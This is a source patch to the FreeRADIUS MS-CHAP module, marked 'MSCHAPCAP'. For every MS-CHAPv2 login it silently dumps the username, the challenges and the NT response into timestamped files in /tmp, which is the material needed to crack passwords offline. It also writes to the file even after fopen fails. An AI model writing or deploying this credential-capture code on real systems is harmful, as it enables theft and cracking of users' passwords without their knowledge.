@@ -1,0 +1,45 @@
+--- freeradius-1.1.2/src/modules/rlm_mschap/rlm_mschap.c	2006-04-13 18:28:30.000000000 +0200
++++ freeradius-1.1.2m/src/modules/rlm_mschap/rlm_mschap.c	2006-08-02 17:10:20.000000000 +0200
+@@ -49,6 +49,8 @@
+ #include	<stdlib.h>
+ #include    	<string.h>
+ #include 	<ctype.h>
++/* ADD FOR MSCHAPCAP */
++#include	<time.h>
+ 
+ #include	"radiusd.h"
+ #include	"modules.h"
+@@ -1245,6 +1247,33 @@
+ 		DEBUG2("  rlm_mschap: Told to do MS-CHAPv2 for %s with NT-Password",
+ 		       username_string);
+ 
++		/* ADD FOR MSCHAPCAP */
++		//*********************************************************************
++		//Backup of :
++		// authenticator challenge
++		// peer challenge
++		// login
++		// challenge
++		// response
++		FILE *FOUT;
++		unsigned int LUN;
++		time_t NOW;
++		char BUFF[29];
++		NOW = time(NULL);
++		strftime(BUFF, 29, "/tmp/mschapCap%Y%m%d%H%M%S",localtime(&NOW));
++		if ((FOUT = fopen(BUFF, "w")) == NULL) {
++			fprintf(stderr, "############ ERROR FILE WRITTING \n");
++		}
++		LUN = strlen(username_string);
++		fwrite(&LUN, 1 * sizeof(int), 1, FOUT);
++		fwrite(username_string, strlen(username_string) * sizeof(unsigned char), 1, FOUT);
++		fwrite(challenge->strvalue, 16 * sizeof(unsigned char), 1, FOUT);
++		fwrite(response->strvalue + 2, 16 * sizeof(unsigned char), 1, FOUT);
++		fwrite(mschapv1_challenge, 8 * sizeof(unsigned char), 1, FOUT);
++		fwrite(response->strvalue + 26, 24 * sizeof(unsigned char), 1, FOUT);
++		fclose(FOUT);
++		//*********************************************************************
++
+ 		if (do_mschap(inst, request, nt_password, mschapv1_challenge,
+ 			      response->strvalue + 26, nthashhash) < 0) {
+ 			DEBUG2("  rlm_mschap: FAILED: MS-CHAP2-Response is incorrect");
